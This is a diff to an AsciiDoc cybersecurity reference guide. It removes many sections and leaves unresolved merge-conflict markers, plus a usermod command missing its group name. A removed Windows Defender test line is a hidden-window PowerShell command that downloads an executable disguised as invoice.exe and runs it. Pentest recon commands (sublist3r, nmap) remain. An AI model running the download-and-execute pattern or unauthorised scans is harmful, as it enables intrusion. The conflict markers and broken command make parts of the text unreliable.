@@ -1,6 +1,10 @@
 = CyberSecurity: A Comprehensive Reference
 Doc Writer <smsharif@secunoid.com>
-v1.65, 22nd January, 2020
+<<<<<<< HEAD
+v1.63, 22 November, 2019
+=======
+v1.63, 23 November, 2019
+>>>>>>> 3bab35c2b489a413cea4d6c178537128e7bfce9e
 :numbered:
 :sectnum:
 :sectnumlevels: 5
@@ -235,23 +239,6 @@ Web site content is located on a non-system NTFS volume.
 == Security Guidelines
 
 <<<
-== Cryptography
-
-Cryptographic Blinding
-
-<<<
-== Digital Identity
-
-Digital Identity is a bridge that connects the physical and the digital world.  You can call them Personna's in a digital world.
-
-Cost of financial intermediation is been going up due to regulation.
-
-According to Europol we are spending about $20b to intercept 0.15% of the fraudulent flows of money.
-
-
-
-
-<<<
 == Application Security
 The scope of application security would be the 
 
@@ -361,15 +348,9 @@ Penetration Tests can include following scopes:
 
 ==== Penetration Testing Methodology
 
-===== Reconnaissance
-. Open Source Intelligence Gathering
-.. Look for sub-domains:
+. Enumerate subdomains
 
 	sublist3r -d <domainname> -t3 -o <filename.txt>
-
-.. Look for sub-domains, users, etc:
-
-	theharvester -d <domainname> -b all -f <outputfilename>
 
 . Discovery Scan
 
@@ -379,11 +360,6 @@ Penetration Tests can include following scopes:
 . Recon scan all ports
 	
 	nmap -p- -v -oA foldername/filename-allports IPAddress
-
-. If webservers are found perform web server enumeration:
-
-	dirb -d <domainname> 
-	gobuster 
 
 . Take notes of all the findings and also include screen captures.
 . 
@@ -462,29 +438,11 @@ evilarc.py is an archiving tool that allows for folder manipulation.
 Ghidra is a software reverse engineering (SRE) framework created and maintained by the National Security Agency Research Directorate. This framework includes a suite of full-featured, high-end software analysis tools that enable users to analyze compiled code on a variety of platforms including Windows, macOS, and Linux. Capabilities include disassembly, assembly, decompilation, graphing, and scripting, along with hundreds of other features. Ghidra supports a wide variety of processor instruction sets and executable formats and can be run in both user-interactive and automated modes. Users may also develop their own Ghidra plug-in components and/or scripts using Java or Python.
 Link: https://ghidra-sre.org/
 
-===== Gitleaks
-
-Link: https://github.com/zricethezav/gitleaks
-
 ===== Gobuster
-
 Gobuster is a tool used to brute-force:
 
 * URIs (directories and files) in web sites.
 * DNS subdomains (with wildcard support).
-
-Install
-
-	sudo apt-get install gobuster
-
-Usage
-
-Scan a website (-u http://192.168.0.155/) for directories using a wordlist (-w /usr/share/wordlists/dirb/common.txt) and print the full URLs of discovered paths (-e):
-
-	*Using dirb word lists* gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt -o filename.txt
-	*Using dirbuster word lists* gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirbuster/directgory-list-2.3-medium.txt -o filename.txt
-	*Using a cookie* gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirbuster/directgory-list-2.3-medium.txt -o filename.txt -c 'cookievariable=valie'
-
 
 [horizontal]
 Source:: https://github.com/OJ/gobuster
@@ -615,10 +573,6 @@ License:: GPL-2+
 
 ===== TheHarvester
 
-===== TruffleHog
-
-Link: https://github.com/dxa4481/truffleHog
-
 ===== Wfuzz
 Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing,etc.
 
@@ -649,11 +603,6 @@ This is just one of innumerable methods a Red Team may operate but is a good exa
 * Social Engineering
 * Web App Scanning
 
-===== Red Team Resources
-
-. https://www.hackingarticles.in/red-teaming/ 
-
-
 ==== Blue Team Assessment
 Blue team assessment is usually a test of the teams' ability to identify and defend the network while under attack by the Red Teams/Penetration Tester/Hacker.
 
@@ -664,10 +613,6 @@ Blue team assessment is usually a test of the teams' ability to identify and def
 * Operational Security
 * Threat Hunters
 * Digital Forensics
-
-===== Powershell to test Windows Defender
-
-	powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
 
 ==== Purple Team
 * Collaborative Security
@@ -781,8 +726,6 @@ With the creation of ATT&CK, MITRE is fulfilling its mission to solve problems f
 
 MITRE ATT&CK website: https://attack.mitre.org/ 
 
-==== Open Threat Exchange(OTX)
-
 ==== Palo Alto Unit42
 Unit 42 is the global threat intelligence team at Palo Alto Networks®
 
@@ -792,18 +735,6 @@ Unit 42 is the global threat intelligence team at Palo Alto Networks®
 https://www.packetstormsecurity.com
 https://www.securityfocus.com
 https://www.exploit-db.com
-
-==== Cisco Talos
-Cisco Talos Intelligence Group is one of the largest commercial threat intelligence teams in the world, comprised of world-class researchers, analysits and engineers.  These teams are supposed by unrivaled telemetry and sophisticated systems to create accurate, rapid and actionable threat intelligence for Cisco Customers, products and services.  Talos defends Cisco customers against knowns and emerging threats, discovers new vulnerabilities in common software, and interdicts threats in the wild beofre they can further harm the internet at large.  Talos maintains the official rules sets of Snort.org, ClamAV, and SpanCop, in addition to releasing many open-source research and analysis tools.
-
-Talos was formed by combining SourceFire's Vulnerability Research Team, the Cisco Threat Research and Communications group, and the Cisco Security Applications Group.  The combined expertise is backed by a sophisticated infrastrucutre, and Cisco's unrivaled telemetry of data that spans across networks, endpoints, cloud environments, virtual systems, and daily web and email traffic.
-
-Link: https://talosintelligence.com/ 
-
-==== Sophos Labs
-
-
-Link: https://www.sophos.com/en-us/labs.aspx 
 
 ==== STIX
 STIX (Structured Threat Information eXpression) was originally conceived as a language to describe cyber threat intelligence. This was groundbreaking at the time because it was the first language to provide a definition of cyber threat intelligence. Although it’s a bit of a fuzzy term, cyber threat intelligence generally describes information about adversaries and their behaviors that can inform defensive actions. For example, knowing that a certain adversary targets financial institutions by using specially crafted spear-phishing emails, and then delivers Trojans that will reach out to a certain set of websites that are known to be malicious, can be very helpful in defending against the attack. STIX captures that type of intelligence in a machine-readable form so that it can be shared among organizations and tools.
@@ -822,90 +753,21 @@ MISP - Open Source Threat Intelligence Platform & Open Standards For Threat Info
 
 Link: https://www.misp-project.org/
 
-=== Threat Hunting
-Threat hunting is a relatively new focal area in information security.  Actively looking for C2C in your environment.  Firewalls, IDS/IPS, SIEM are not able to detect C2C.
-
-*Beacons*
-Looking for persistent outbound signal
-* Is there consistency in timing
-* 
-
-==== Detecting C2 over DNS
-* Capture all DNS traffic
-** Capture tool of your choice
-** Longer the capture time, the better
-* Filter so it is DNS traffic only
-* Extract to text so we can sort and count
-* Review total FQDNs per domain
-* Check domain with a lot of FQDNs
-
-==== RITA
-
-Link: https://www.activecountermeasures.com/free-tools/rita/ 
-
-==== Tshark
-	tshark -q -z conv,ip -r dnscat2.pcapng | tr -s ' ' | cut -d " " -f 1,2,3,10 | sort -k 4 -rn | head 
-	
-	tshark -r thunt-lab.pcapng -T fields -e dns.qry.name | sort |uniq | rev | cut -d '.' -f 1-2 |rev | uniq -c | sort -rn | head -10
-
-==== Zeek
-Network sniffing tool, formerly called Bro.
-
-
-==== Reference Sites
-. https://pentestmag.com/using-the-mitre-attck-navigator-for-intelligence-gathering-pre-purple-teaming/
-. https://www.activecountermeasures.com/raspberry_pi_sensor/
-. https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA10g000000ClarCAC
-. https://gist.github.com/MSAdministrator/7a61025263e279a740835da4b205e6d0
-. https://www.twistlock.com/2019/01/02/whitelisting-blacklisting-security-strategy/
-. https://en.wikipedia.org/wiki/Domain_fronting
-. https://www.bleepingcomputer.com/news/security/teamviewer-confirms-undisclosed-breach-from-2016/
-. https://www.linkedin.com/posts/kirtaroza_cyberthreatintelligence-note-paython-activity-6600672896148959232-J-r8/
-. https://github.com/activecm/passer
-. http://www.stearns.org/doc/pcap-apps.html
-. HELKS
-. SELKS
-. Packet Squirrel https://shop.hak5.org/products/packet-squirrel
-. https://register.gotowebinar.com/register/2540509980495221261?source=ACMtwitter
-. netgear gs305e
 
 === Threat Risk Assessments
-*Threat*: Any potential actor that has the capability, motivation, or intent to exploit a vulnerability.
+Threat: Any potential actor that has the capability, motivation, or intent to exploit a vulnerability.
 Vulnerability: Is a weakness that allows a threat to compromise the security of a system.
-
-*Risk*: Likelihood of a threat source to exploit a vulnerability to target a critical asset and impact a business negatively.
+Risk: Likelihood of a threat source to exploit a vulnerability to target a critical asset and impact a business negatively.
 Controls, safeguards, countermeasures are implemented to reduce the risk.
 
-=== Bug Bounty / Crowsourced Security Platforms
-. Hackerone
-. Bugcrowd
-. Synack
-. Detectify
-. cobalt
-. Open Bug Bounty
-. Zerocopter
-. YesWeHack
-. HackenProof
-. Vulnerability Lab
-. FireBounty
-. BugBounty.jp
-. AntiHACK
-. Intigriti
-. SafeHats
-. RedStorm
-. Cyber Army ID
-. Yogosha
+
+=== Threat Hunting
+Threat hunting is a relatively new focal area in information security.
 
 <<<
 == Digital Forensics
 
 
-=== SOF ELK
-
-SOF-ELK® is a “big data analytics” platform focused on the typical needs of computer forensic investigators/analysts and information security operations personnel. The platform is a customized build of the open source Elastic stack, consisting of the Elasticsearch storage and search engine, Logstash ingest and enrichment system, Kibana dashboard frontend, and Elastic Beats log shipper (specifically filebeat). With a significant amount of customization and ongoing development, SOF-ELK® users can avoid the typically long and involved setup process the Elastic stack requires. Instead, they can simply download the pre-built and ready-to-use SOF-ELK® virtual appliance that consumes various source data types (numerous log types as well as NetFlow), parsing out the most critical data and visualizing it on several stock dashboards. Advanced users can build visualizations the suit their own investigative or operational requirements, optionally contributing those back to the primary code repository.
-
-Link: https://github.com/philhagen/sof-ELK 
-Training: https://youtu.be/Hk6An-LJ4jY   
 
 === Base64 Encoded Data
 Base64 endoded data is not human readable, but it is determinsitic, similar to rot13 decoder.
@@ -1156,50 +1018,23 @@ A documented process must be followed to ensure compliance to security policy an
 * Embedded in culture and mindset 
 
 <<<
-== Kali Reference
+== Kali Linux Command Reference
 
-. Add user and give root privs
-.. login as root and the user
+. login as root and the user
 
 	useradd -m <username>
 
-.. Assign a password to the user
+. Assign a password to the user
 
 	passwd <username>
 
-.. Add a user to sudoers file
+. Add a user to sudoers file
 
-	usermod -a -G sudo <username>
+	usermod -a -G <username>
 
-.. Change user shell to bash
+. Change user shell to bash
 
 	chsh -s /bin/bash <username>
-
-. Shrink partition
-.. Login to your system as root and open a terminal window.  Lets assume the paritition is /dev/xxx/yyy and is currently 40G, and you want to reduce it to 30G
-
-	df -k
-	unmount /dev/xxx/yyy
-	e2fsck -fy /dev/xxx/yyy
-	resize2fs /dev/xxx/yyy 30G
-	lvreduce -L 30G /dev/xxx/yyy
-	resize2fs /dev/xxx/yyy
-	mount /dev/xxx/yyy
-
-. Expand partition
-
-Lets assume the file system is /dev/xxx/yyy. Current size is 10G and you want to add another 10G
-.. Show space in current Volume group, look for Free PE/Size and make note of it, in our case it
-
-	vgdisplay
-
-.. Extend the logical volume
-
-	lvextend -L+10G /dev/xxx/yyy
-
-.. Resize the filesystem
-
-	resize2fs /dev/xxx/yyy
 
 <<<
 == Powershell Reference
@@ -1479,7 +1314,7 @@ Beginning in Windows PowerShell 3.0, the Persist parameter of the New-PSDrive cm
 	get-NetAdapterStatistics
 
 <<<
-== Github Reference
+== Github
 
 === Adding a new repository to github.com
 
@@ -1504,27 +1339,8 @@ image::github4.png[]
 
 	git clone <repository URL from git page>
 
-=== What to do after renaming your github username?
-After you have changed your github.com user name, you will have to relink all your local github repositories to the github on the web.  Here are the steps:
-
-. Open GitCMD or GitBASH
-. Change directory to the repository where you have cloned the respository from the web
-. Check where does this repository points:
-
-	git remote -v
-
-image::github-repo-now.png[]
-. Change to new github repository
-
-	git remote set-url origin git@github.com:secprivrisk/CyberSecurity.git
-
-. Confirm the change by issuing the command:
-
-	git remote -v
-
-image::github-repo-new.png[]
-
 <<<
+
 == Ethical Hacking References
 
 === By Pethuraj M
@@ -1560,7 +1376,6 @@ http://tiny.cc/b6Rg
 == Terms Used
 [horizontal]
 ATT&CK:: Adversatial Tactics Techniques & Common Knowledge
-APT:: Advanced Persistent Threat
 CTF:: Capture The Flag
 CTI:: Cyber Threat Intelligence
 ICS:: Industrial Conrol Systems
@@ -1570,10 +1385,7 @@ Med-jacking:: is a new kind of cybersecurity threat to health care systems. Medj
 mDNS:: Multicast Domain Name System
 OCG:: Organized Criminal groups
 OSINT:: Open Source Inteligence Tools
-PLC:: Programmagle Logic controller
-Smishing:: Phishing through SMS
 TTP:: Techniques, Tactics, Procedures
-Vishing:: Phishing through voice calls
 WPAD:: Web Proxy Auto Discovery Protocol
 
 <<<
